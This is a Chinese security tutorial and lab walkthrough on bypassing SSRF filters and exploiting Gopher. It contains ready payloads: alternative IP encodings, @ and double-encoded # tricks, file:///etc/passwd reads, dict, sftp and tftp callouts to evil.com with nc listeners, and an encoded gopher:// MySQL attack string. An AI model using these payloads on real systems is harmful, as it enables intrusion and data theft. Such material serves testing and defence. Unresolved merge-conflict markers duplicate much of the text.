---
title: SSRF 防护绕过思路与 Gopher 利用浅析 - 先知社区
<<<<<<< HEAD
url: https://xz.aliyun.com/t/14086
clipped_at: 2024-03-20 09:39:32
=======
url: https://xz.aliyun.com/t/14086?time__1311=mqmx9DBG0QYxyDBqDTeeuutow2kUQDiwAD
clipped_at: 2024-03-13 11:15:49
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
category: default
tags: 
 - xz.aliyun.com
---


# SSRF 防护绕过思路与 Gopher 利用浅析 - 先知社区

## 文章前言

SSRF (Server-Side Request Forgery, 服务器端请求伪造) 是一种由攻击者构造形成，由服务端发起请求的一个安全漏洞，产生的原因是由于服务端提供了从其他服务器应用获取数据的功能且没有对地址和协议等做过滤和限制，常见的一个场景就是通过用户输入的 URL 来获取图片，此功能如果被恶意使用就可以用存在缺陷的 Web 应用作为代理攻击远程和本地的服务器，本篇文章我能主要对 SSRF 的攻击案例、防护绕过以及 Gopher 的实践利用进行介绍

## 业务场景

SSRF 漏洞在下面几种 web 应用场景中较为常见，在日常安全测试评估时可以多留意一下：

-   XXE 漏洞点
-   其他加载 URL 的功能
-   第三方集成链接配置
-   JDBC 数据库测试链接服务
-   图片 / 文章收藏：通过 URL 获取目标的 title 等信息
-   图片加载 / 下载：通过 URL 加载网络图片 (头像上传等)
-   转码服务：适配手机屏幕大小并通过 URL 地址进行图片转码
-   分享功能：通过 URL 地址分享网页内容，通过 URL 获取目标页标签等内容

## 攻防场景

### 攻击服务器自身

在这里我们以通过 SSRF 实现权限绕过的漏洞为例进行演示说明，在购物应用程序中对用户角色有普通用户和管理用户之分，管理用户有用户管控面板的权限可以对用户进行删除操作，当我们直接添加 "/admin" 访问时，此时会被直接拦截，而在我们点击 WEB 应用功能点的时候发现 stockApi 参数为 URL 路径，随后我们直接更改其 URL 路径并将其指向本地，同时在其后添加 /admin 访问路径进行访问，此时直接访问到了管理用户才可以查看的页面并从中获取到了接口：

<<<<<<< HEAD
[![](assets/1710898772-8d1f021f97242c3e2451852da2d4705d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312161450-99059bca-e048-1.png)

随后在测试中发现接口并没有做严格的权限校验导致普通用户可以直接调用接口进行删除操作，这里我们直接调用接口对 Carlos 用户账户进行了移除操作：

[![](assets/1710898772-d5b1c5bb4444bfd5836880c2d6b1cadf.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312161646-ddf87ebe-e048-1.png)
=======
[![](assets/1710299749-8d1f021f97242c3e2451852da2d4705d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312161450-99059bca-e048-1.png)

随后在测试中发现接口并没有做严格的权限校验导致普通用户可以直接调用接口进行删除操作，这里我们直接调用接口对 Carlos 用户账户进行了移除操作：

[![](assets/1710299749-d5b1c5bb4444bfd5836880c2d6b1cadf.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312161646-ddf87ebe-e048-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

### 攻击后端其他系统

服务器端请求伪造中经常出现的另一种信任关系是应用服务器能够与用户不能直接到达的其他后端系统进行交互，这些系统通常具有不可路由的私有 IP 地址，由于后端系统通常受到网络拓扑的保护因此它们通常具有较弱的安全性，在许多情况下内部后端系统包含敏感功能，能够与系统交互的任何人都可以不经过身份验证就访问这些功能，如果在上面的实例中我们不晓得后端的服务器 IP 地址是多少，但是通过其他途径得知管理路径为 /admin，那么我们可以进行如下尝试攻击：  
首先我们将请求数据包发送到 intruder 功能模块并设置 IP 地址为变量：  
<<<<<<< HEAD
[![](assets/1710898772-e5f9e4e7e18b202594fde4dea3fd3bb9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312162852-8ec3c504-e04a-1.png)  
随后设置载荷  
[![](assets/1710898772-99924829992c47ff5de7d15746ef6e5c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312162931-a626c55c-e04a-1.png)  
随后探测到后端存活的 Web 服务并获取到敏感接口

[![](assets/1710898772-da95e0ee4eb37b7da52839606d0f5c7b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312162956-b51c7250-e04a-1.png)

[![](assets/1710898772-45dabedd8fa52209527818a7f1d9b5a6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312163008-bc2c6c6c-e04a-1.png)

随后我们可以通过直接调用对应的接口来实现账户的删除操作，达到和上面同样的目的：  
[![](assets/1710898772-8d58f29963637780396edac2d75ca39a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312163055-d81a7b58-e04a-1.png)
=======
[![](assets/1710299749-e5f9e4e7e18b202594fde4dea3fd3bb9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312162852-8ec3c504-e04a-1.png)  
随后设置载荷  
[![](assets/1710299749-99924829992c47ff5de7d15746ef6e5c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312162931-a626c55c-e04a-1.png)  
随后探测到后端存活的 Web 服务并获取到敏感接口

[![](assets/1710299749-da95e0ee4eb37b7da52839606d0f5c7b.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312162956-b51c7250-e04a-1.png)

[![](assets/1710299749-45dabedd8fa52209527818a7f1d9b5a6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312163008-bc2c6c6c-e04a-1.png)

随后我们可以通过直接调用对应的接口来实现账户的删除操作，达到和上面同样的目的：  
[![](assets/1710299749-8d58f29963637780396edac2d75ca39a.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312163055-d81a7b58-e04a-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

### 黑名单过滤绕过

在渗透测试过程中一些应用程序会阻止包含主机名 (例如：127.0.0.1 和 localhost) 或敏感 URL (例如：上面的 /admin) 的输入，在这种情况下我们可以使用各种技术绕过过滤器

-   使用可以替代 127.0.0.1 的 IP 表示，例如：2130706433、01770000001 或 127.1
-   使用注册的域名并将其解析到 127.0.0.1，例如:spoofed.burpcollaborator.net
-   使用 URL 编码或者通过大小写混淆的方式绕过被组织的字符串
-   使用用户自己可以控制的 URL 并将其重定向到目标 URL
-   使用使用不同的重定向代码和不同的协议，例如：在重定向期间从 http: 切换到 https: 协议

我们紧接着上面的环境进行安全测试，不过这里我们在对 stockApi 参数进行 fuzzing 的时候发现将 stockApi 参数地址更改为 [http://127.0.0.1](http://127.0.0.1/) 会被拦截  
<<<<<<< HEAD
[![](assets/1710898772-fc5d8f9148ff150bf00d31e4f1b53d80.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312163857-f757a0a8-e04b-1.png)  
随后将 127.0.0.1 更改为其等价的 127.1 并进行尝试，可以看到成功获取到响应

[![](assets/1710898772-2dc3d531a5495b9d4e265bd505696cdc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312163919-04690a0c-e04c-1.png)  
紧接着我们去添加一个 /admin 路径对用户进行删除操作，但是发现更改 URL 为 [http://127.1/admin](http://127.0.0.1/admin) 再次被拦截，由此可见这里不仅对本地地址进行了黑名单处理，而且还对特殊的敏感路径进行了过来处理

[![](assets/1710898772-cb112c58f931c9a79049f38cc8c0e274.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312164016-26a87364-e04c-1.png)  
经过一段时间的思考我们发现可以使用 URL 编码的方式来对敏感路径进行编码处理，这里采用双重 URL 编码，大家可以想一下为啥是双重 URL 编码：  
[![](assets/1710898772-1950d912f297c8101ffca28eacc5a96d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312164157-63052302-e04c-1.png)  
随后我们照常调用接口删除用户  
[![](assets/1710898772-4423c021435af255c28c3ab4789dd077.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312165647-758a3a56-e04e-1.png)

### 白名单过滤绕过

在 Web 开发中部分应用程序只允许与白名单匹配的值，例如：以白名单开头或包含白名单的输入，在这种情况下您可以利用 URL 解析中的不一致性来规避过滤器，例如：我们可以使用 @字符在主机名之前的 URL 中嵌入凭据，例如：[https://expected-host:fakepassword@evil-host](https://expected-host:fakepassword@evil-host/) ，同时也可以使用 #字符来表示 URL 分段，例如：[https://evil-host#expected-host](https://evil-host/#expected-host) ，同时我们也可以对字符进行 URL 编码以混淆 URL 解析代码，如果实现过滤器的代码处理 URL 编码的字符的方式不同于执行后端 HTTP 请求的代码，也可以尝试双重编码字符，一些服务器递归地对它们接收到的输入进行 URL 解码，这可能导致进一步的差异，下面我们继续以上面的接口为例进行演示说明，不过这里的过滤策略有变更，成为了白名单，具体如下：  
首先我们将 stockApi 更改为 [http://127.0.0.1/](http://127.0.0.1/) ，此时应用程序会解析 URL，提取主机名并根据白名单进行验证  
[![](assets/1710898772-02d041a3f779e296561af35b28502240.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170316-5d7274be-e04f-1.png)  
随后我们将 URL 更改为 [http://username@stock.weliketoshop.net/](http://username@stock.weliketoshop.net/) 后重新请求，可以看到请求被接受，表明 URL 解析器支持嵌入的凭证

[![](assets/1710898772-22b2a959286dd3e1fa63aeebafa9571c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170351-723b36ba-e04f-1.png)  
随后在用户名后添加一个 #并观察 URL，发现请求被拒绝

[![](assets/1710898772-ab2d645da8e19d35d5b4c416e774a9b6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170408-7c3182b4-e04f-1.png)  
紧接着我们将 #双 URL 编码为 %2523 并观察极其可疑的 "Internal Server Error”响应，这表明服务器可能试图连接到"username"

[![](assets/1710898772-663e8677250e5aef8f50586dcac0669c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170444-91805550-e04f-1.png)  
随后将 URL 更改为如下来访问 admin 路径

[![](assets/1710898772-89a12d76c669eecd89bc26f211911b75.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170500-9b01b088-e04f-1.png)  
下面就变得简单多了，我们直接拼接 URL 实现：  
[![](assets/1710898772-d787b5b7c976309dafc1eb0668883fde.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170612-c6573988-e04f-1.png)  
随后调用接口删除用户 carlos  
[![](assets/1710898772-4bacc1c9ce182e5e14db7409eeaa1075.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170634-d2e86686-e04f-1.png)

### 重定向绕过检查

有时候通过利用开放重定向漏洞可以规避任何类型的基于过滤器的防御，在前面的 SSRF 示例中假设用户提交的 URL 经过严格验证以防止恶意利用 SSRF 行为，但是允许其 URL 的应用程序包含一个开放重定向漏洞，如果用于后端 HTTP 请求的 API 支持重定向，那么您可以构造一个满足过滤器的 URL 并构造一个到所需后端目标的重定向请求，例如：应用程序包含一个开放重定向漏洞，其中以下 URL：/product/nextProduct?currentProductId=6&path=[http://evil-user.net](http://evil-user.net/) ，我们可以将其重定向返回到：[http://evil-user.net](http://evil-user.net/) ，下面我们继续以上面的例子为例进行演示：  
首先尝试篡改 stockApi 参数，观察到无法让服务器直接向不同的主机发出请求  
[![](assets/1710898772-8af6d5574483fe22e628f0c75377bbc3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171117-7c2466fa-e050-1.png)

通过单击 "next product" 按钮发现 path 参数被放入重定向响应的 Location 头中，导致了一个开放的重定向  
[![](assets/1710898772-658ff97621cabb1735b16e923ea6f385.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171205-9845b424-e050-1.png)

随后创建一个利用开放重定向漏洞的 URL，重定向到管理界面并将其输入检查器上的 stockApi 参数

[![](assets/1710898772-050c7be0d16ba6dd61e1b66225c7ae53.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171228-a6198e2c-e050-1.png)

构造一下删除用户的 URL 请求

```plain
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

[![](assets/1710898772-5034839bdaa0e69eae9b8313ced79e05.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171301-b9c10536-e050-1.png)
=======
[![](assets/1710299749-fc5d8f9148ff150bf00d31e4f1b53d80.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312163857-f757a0a8-e04b-1.png)  
随后将 127.0.0.1 更改为其等价的 127.1 并进行尝试，可以看到成功获取到响应

[![](assets/1710299749-2dc3d531a5495b9d4e265bd505696cdc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312163919-04690a0c-e04c-1.png)  
紧接着我们去添加一个 /admin 路径对用户进行删除操作，但是发现更改 URL 为 [http://127.1/admin](http://127.0.0.1/admin) 再次被拦截，由此可见这里不仅对本地地址进行了黑名单处理，而且还对特殊的敏感路径进行了过来处理

[![](assets/1710299749-cb112c58f931c9a79049f38cc8c0e274.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312164016-26a87364-e04c-1.png)  
经过一段时间的思考我们发现可以使用 URL 编码的方式来对敏感路径进行编码处理，这里采用双重 URL 编码，大家可以想一下为啥是双重 URL 编码：  
[![](assets/1710299749-1950d912f297c8101ffca28eacc5a96d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312164157-63052302-e04c-1.png)  
随后我们照常调用接口删除用户  
[![](assets/1710299749-4423c021435af255c28c3ab4789dd077.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312165647-758a3a56-e04e-1.png)

### 白名单过滤绕过

在 Web 开发中部分应用程序只允许与白名单匹配的值，例如：以白名单开头或包含白名单的输入，在这种情况下您可以利用 URL 解析中的不一致性来规避过滤器，例如：我们可以使用 @字符在主机名之前的 URL 中嵌入凭据，例如：[https://expected-host:fakepassword@evil-host](https://expected-host:fakepassword@evil-host/) ，同时也可以使用 #字符来表示 URL 分段，例如：[https://evil-host#expected-host](https://evil-host/#expected-host) ，同时我们也可以对字符进行 URL 编码以混淆 URL 解析代码，如果实现过滤器的代码处理 URL 编码的字符的方式不同于执行后端 HTTP 请求的代码，也可以尝试双重编码字符，一些服务器递归地对它们接收到的输入进行 URL 解码，这可能导致进一步的差异，下面我们继续以上面的接口为例进行演示说明，不过这里的过滤策略有变更，成为了白名单，具体如下：  
首先我们将 stockApi 更改为 [http://127.0.0.1/](http://127.0.0.1/) ，此时应用程序会解析 URL，提取主机名并根据白名单进行验证  
[![](assets/1710299749-02d041a3f779e296561af35b28502240.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170316-5d7274be-e04f-1.png)  
随后我们将 URL 更改为 [http://username@stock.weliketoshop.net/](http://username@stock.weliketoshop.net/) 后重新请求，可以看到请求被接受，表明 URL 解析器支持嵌入的凭证

[![](assets/1710299749-22b2a959286dd3e1fa63aeebafa9571c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170351-723b36ba-e04f-1.png)  
随后在用户名后添加一个 #并观察 URL，发现请求被拒绝

[![](assets/1710299749-ab2d645da8e19d35d5b4c416e774a9b6.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170408-7c3182b4-e04f-1.png)  
紧接着我们将 #双 URL 编码为 %2523 并观察极其可疑的 "Internal Server Error”响应，这表明服务器可能试图连接到"username"

[![](assets/1710299749-663e8677250e5aef8f50586dcac0669c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170444-91805550-e04f-1.png)  
随后将 URL 更改为如下来访问 admin 路径

[![](assets/1710299749-89a12d76c669eecd89bc26f211911b75.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170500-9b01b088-e04f-1.png)  
下面就变得简单多了，我们直接拼接 URL 实现：  
[![](assets/1710299749-d787b5b7c976309dafc1eb0668883fde.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170612-c6573988-e04f-1.png)  
随后调用接口删除用户 carlos  
[![](assets/1710299749-4bacc1c9ce182e5e14db7409eeaa1075.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170634-d2e86686-e04f-1.png)

### 重定向绕过检查

有时候通过利用开放重定向漏洞可以规避任何类型的基于过滤器的防御，在前面的 SSRF 示例中假设用户提交的 URL 经过严格验证以防止恶意利用 SSRF 行为，但是允许其 URL 的应用程序包含一个开放重定向漏洞，如果用于后端 HTTP 请求的 API 支持重定向，那么您可以构造一个满足过滤器的 URL 并构造一个到所需后端目标的重定向请求，例如：应用程序包含一个开放重定向漏洞，其中以下 URL：/product/nextProduct?currentProductId=6&path=[http://evil-user.net](http://evil-user.net/) ，我们可以将其重定向返回到：[http://evil-user.net](http://evil-user.net/) ，下面我们继续以上面的例子为例进行演示：  
首先尝试篡改 stockApi 参数，观察到无法让服务器直接向不同的主机发出请求  
[![](assets/1710299749-8af6d5574483fe22e628f0c75377bbc3.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171117-7c2466fa-e050-1.png)

通过单击 "next product" 按钮发现 path 参数被放入重定向响应的 Location 头中，导致了一个开放的重定向  
[![](assets/1710299749-658ff97621cabb1735b16e923ea6f385.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171205-9845b424-e050-1.png)

随后创建一个利用开放重定向漏洞的 URL，重定向到管理界面并将其输入检查器上的 stockApi 参数

[![](assets/1710299749-050c7be0d16ba6dd61e1b66225c7ae53.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171228-a6198e2c-e050-1.png)

构造一下删除用户的 URL 请求

```bash
/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos
```

[![](assets/1710299749-5034839bdaa0e69eae9b8313ced79e05.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171301-b9c10536-e050-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

## 技巧扩展

### 利用 \[::\]

<<<<<<< HEAD
```plain
http://[::]:80/  >>>  http://127.0.0.1
```

[![](assets/1710898772-f5625d579365cf25ab67349b073f5191.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170811-0d37e1b8-e050-1.png)

### 利用 @

```plain
http://example.com@127.0.0.1
```

[![](assets/1710898772-e1f748a91b51c54534358c666557a041.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171400-dcba2e6e-e050-1.png)

### 利用短地址

```plain
http://dwz.cn/11SMa  >>>  http://127.0.0.1
```

[![](assets/1710898772-e18a3f1e7bbed2a2c7db020ab3ea7623.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171512-07a48b1a-e051-1.png)

[![](assets/1710898772-b281a86ff495df71df05f82fc03d1469.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171518-0ba3b6aa-e051-1.png)
=======
```bash
http://[::]:80/  >>>  http://127.0.0.1
```

[![](assets/1710299749-f5625d579365cf25ab67349b073f5191.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312170811-0d37e1b8-e050-1.png)

### 利用 @

```bash
http://example.com@127.0.0.1
```

[![](assets/1710299749-e1f748a91b51c54534358c666557a041.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171400-dcba2e6e-e050-1.png)

### 利用短地址

```bash
http://dwz.cn/11SMa  >>>  http://127.0.0.1
```

[![](assets/1710299749-e18a3f1e7bbed2a2c7db020ab3ea7623.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171512-07a48b1a-e051-1.png)

[![](assets/1710299749-b281a86ff495df71df05f82fc03d1469.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171518-0ba3b6aa-e051-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

### 利用 DNS 解析

在域名上设置 A 记录，指向 127.0.01  
<<<<<<< HEAD
[![](assets/1710898772-c4ea36af8f6998a49b0ae14c8b42d847.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171534-1529c5a2-e051-1.png)
=======
[![](assets/1710299749-c4ea36af8f6998a49b0ae14c8b42d847.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171534-1529c5a2-e051-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

### 利用进制转换

A、十进制转换示例  
使用在线工具转换：[https://tool.520101.com/wangluo/jinzhizhuanhuan/](https://tool.520101.com/wangluo/jinzhizhuanhuan/)

<<<<<<< HEAD
[![](assets/1710898772-f53703b60a9a277af0829b9c89eca7cc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171550-1e8382be-e051-1.png)

直接访问：[http://2130706433](http://127.0.0.1/)

[![](assets/1710898772-49e4595404ad67befa33ea40a6596123.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171600-24b271f4-e051-1.png)
=======
[![](assets/1710299749-f53703b60a9a277af0829b9c89eca7cc.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171550-1e8382be-e051-1.png)

直接访问：[http://2130706433](http://127.0.0.1/)

[![](assets/1710299749-49e4595404ad67befa33ea40a6596123.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171600-24b271f4-e051-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

B、八进制转换示例：  
在线转换工具：[https://www.xuhuhu.com/ip-to-octal-converter.html](https://www.xuhuhu.com/ip-to-octal-converter.html)

<<<<<<< HEAD
[![](assets/1710898772-1f5123937e1c1b012a2b95d40572dc82.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171615-2db6b666-e051-1.png)

在访问的时候加 0 表示使用八进制 (可以是一个 0 也可以是多个 0，跟 XSS 中多加几个 0 来绕过过滤一样

```plain
http://0177.0000.0000.0001
```

[![](assets/1710898772-4f787250d8afff5205f92bcf4ad07421.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171637-3add4bca-e051-1.png)  
C、十六进制转换  
使用在线工具转换：[https://tool.520101.com/wangluo/jinzhizhuanhuan/](https://tool.520101.com/wangluo/jinzhizhuanhuan/)

[![](assets/1710898772-67bbaa006eab5f279c43b06fe1e3c659.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171650-420d534a-e051-1.png)

在访问的时候加 0x

```plain
http://0x7f000001
```

[![](assets/1710898772-26086c31ec1ef028de1012647f0b9ca9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171707-4c2ec8ea-e051-1.png)

### 利用特殊地址

```plain
http://0/
```

[![](assets/1710898772-e22190f2950259933e1d979fd4fde802.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171946-ab5a079e-e051-1.png)
=======
[![](assets/1710299749-1f5123937e1c1b012a2b95d40572dc82.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171615-2db6b666-e051-1.png)

在访问的时候加 0 表示使用八进制 (可以是一个 0 也可以是多个 0，跟 XSS 中多加几个 0 来绕过过滤一样

```bash
http://0177.0000.0000.0001
```

[![](assets/1710299749-4f787250d8afff5205f92bcf4ad07421.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171637-3add4bca-e051-1.png)  
C、十六进制转换  
使用在线工具转换：[https://tool.520101.com/wangluo/jinzhizhuanhuan/](https://tool.520101.com/wangluo/jinzhizhuanhuan/)

[![](assets/1710299749-67bbaa006eab5f279c43b06fe1e3c659.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171650-420d534a-e051-1.png)

在访问的时候加 0x

```bash
http://0x7f000001
```

[![](assets/1710299749-26086c31ec1ef028de1012647f0b9ca9.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171707-4c2ec8ea-e051-1.png)

### 利用特殊地址

```bash
http://0/
```

[![](assets/1710299749-e22190f2950259933e1d979fd4fde802.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312171946-ab5a079e-e051-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

### 利用伪协议类

**file 协议**  
file:// 协议用来从文件系统获取文件

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
http://example.com/ssrf.php?url=file:///etc/passwd
http://example.com/ssrf.php?url=file:///C:/Windows/win.ini
```

<<<<<<< HEAD
[![](assets/1710898772-8e9b232d8ee5220c1826ca8c1170ea7d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312172022-c0954042-e051-1.png)  
[![](assets/1710898772-6be63753f16bb25893d304c50b72024c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312172035-c8727ed8-e051-1.png)
=======
[![](assets/1710299749-8e9b232d8ee5220c1826ca8c1170ea7d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312172022-c0954042-e051-1.png)  
[![](assets/1710299749-6be63753f16bb25893d304c50b72024c.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312172035-c8727ed8-e051-1.png)
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f

**dict 协议**  
dict 协议是一个字典服务器协议，通常用于让客户端使用过程中能够访问更多的字典源，但是在 SSRF 中如果可以使用 dict 协议那么就可以轻易的获取目标服务器端口上运行的服务版本等信息

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
http://example.com/ssrf.php?dict://evil.com:1337/

evil.com:$ nc -lvp 1337
Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 31126)
CLIENT libcurl 7.40.0
```

**sftp 协议**  
Sftp 代表 SSH 文件传输协议或安全文件传输协议，它是 SSH 的内含协议，在安全连接上与 SSH 类似

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
http://example.com/ssrf.php?url=sftp://evil.com:1337/

evil.com:$ nc -lvp 1337
Connection from [192.168.0.12] port 1337 [tcp/*] accepted (family 2, sport 37146)
SSH-2.0-libssh2_1.4.2
```

**ldap 协议**  
LDAP 代表轻量级目录访问协议，它是一种通过 IP 网络管理和访问分布式目录信息服务的应用协议

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
http://example.com/ssrf.php?url=ldap://localhost:1337/%0astats%0aquit
http://example.com/ssrf.php?url=ldaps://localhost:1337/%0astats%0aquit
http://example.com/ssrf.php?url=ldapi://localhost:1337/%0astats%0aquit
```

**tftp 协议**  
tftp://- 简单文件传输协议是一种简单的锁步文件传输协议，它允许客户端从远程主机获取文件或将文件放到远程主机上

<<<<<<< HEAD
```plain
=======
```bash
>>>>>>> 4992f5f682bf7aa8873ceb2495ac1d2a8296850f
http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET

evil.com:# nc -lnvp 1337
Listening on [0.0.0.0] (family 0, port 1337)
TESTUDPPACKEToctettsize0blksize512timeout3
```

## Gopher 利用

### 协议介绍

Gopher 协议是一种早期的互联网协议，于 1991 年诞生，它的设计目标是提供一种简单、易用的方式来浏览和检索互联网上的文档，Gopher 协议在 Web 出现之前很流行并且在一段时间内是互联网上最主要的信息浏览方式之一，Gopher 协议的特点是其简洁性和层次结构，它使用类似于文件系统的层次结构来组织文档和资源，每个 Gopher 服务器都可以提供一个层次结构的目录，其中包含文档、文件和其他资源，用户可以使用 Gopher 客户端连接到服务器并通过浏览目录来查找和选择感兴趣的内容，目录中的每个项都可以是一个文档、一个文件、一个子目录或者一个特定的 Gopher 服务，随着 Web 的迅速发展，HTTP 协议取代了 Gopher 协议成为互联网上主流的协议，因为它提供了更丰富的功能和更广泛的应用支持，Gopher 协议逐渐衰落，但仍有一些人继续使用它来保护和维护早期互联网文化，此外一些 Gopher 服务器仍然存在，供人们回顾和体验互联网的早期阶段，同时 Gopher 协议也可以用于 SSRF 中实施攻击操作

### 协议利用

这里我们以 Nagini 靶机中的 SSRF 为例对 Gopher 协议的利用进行演示：

首先我们在打靶的过程中发现存在一处 SSRF 风险，可以使用伪协议进行文件的读取操作：

<<<<<<< HEAD
[![](assets/1710898772-ef3f093e8915bae666cb44c39b4fcf88.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312172742-c700bd2a-e052-1.png)  
[![](assets/1710898772-6b12d1cf7b81a50868d9556763fd46df.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312172752-cd0b79c6-e052-1.png)

在之前的打靶过程中我们发现 Joomla 是可以管理数据库的，只是比较奇怪的是 nmap 并没有扫描出来 3306 端口，也许可能是靶机对其访问 IP 做了防护，导致只能以 127.0.0.1 连接，随后我们结合 Gopher 协议对本地的 MySQL 数据库发起攻击测试 (之前我们已经有了 mysql 的连接账户和密码)，在此之前我们要用一下 Gopherus 工具，生成用于攻击 MySQL 的攻击载荷，这里我们的数据库名称为 goblin，我们要执行的命令是使用 joomla 数据库并查看表名信息

```plain
Gopherus --exploit mysql
```

[![](assets/1710898772-423325e8bd05322e74dc4dc23bba13f4.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312172940-0d4ad662-e053-1.png)  
随后测试载荷：

```plain
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%ff%01%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%67%6f%62%6c%69%6e%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00%66%03%5f%6f%73%05%4c%69%6e%75%78%0c%5f%63%6c%69%65%6e%74%5f%6e%61%6d%65%08%6c%69%62%6d%79%73%71%6c%04%5f%70%69%64%05%32%37%32%35%35%0f%5f%63%6c%69%65%6e%74%5f%76%65%72%73%69%6f%6e%06%35%2e%37%2e%32%32%09%5f%70%6c%61%74%66%6f%72%6d%06%78%38%36%5f%36%34%0c%70%72%6f%67%72%61%6d%5f%6e%61%6d%65%05%6d%79%73%71%6c%19%00%00%00%03%75%73%65%20%6a%6f%6f%6d%6c%61%3b%20%73%68%6f%77%20%74%61%62%6c%65%73%3b%01%00%00%00%01
```

[![](assets/1710898772-935b2de918094a2d53ee7e27d81b757d.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240312173005-1c5b4812-e053-1.png)  
随后查看源代码发现 joomla\_users 这个表名  
